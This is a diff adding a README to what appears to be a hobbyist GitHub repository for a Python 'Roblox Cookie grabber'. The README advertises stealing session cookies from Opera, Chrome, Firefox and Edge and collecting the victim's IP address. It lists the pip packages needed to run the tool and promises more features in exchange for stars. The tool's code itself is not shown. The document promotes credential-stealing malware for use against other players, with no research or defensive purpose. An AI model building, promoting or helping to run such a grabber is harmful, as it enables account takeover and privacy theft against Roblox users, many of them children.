@@ -1,1 +1,24 @@
-# grabbed
+# Simple Roblox Cookie grabber 
+
+***Simple python script use for roblox***
+
+#### What it does it grab
+- Grabs from the following broswers; 
+
+- Oprea (Sorta) , Chrome , Firefox , Edge
+
+- Ip recovery 
+
+## more info 
+
+Libs to run the program : `pip install requests` `pip install browser_cookies3`
+
+credits ; scooby
+
+#### more stars = roblox cookie info , ip info , etc 
+
+
+
+
+
+
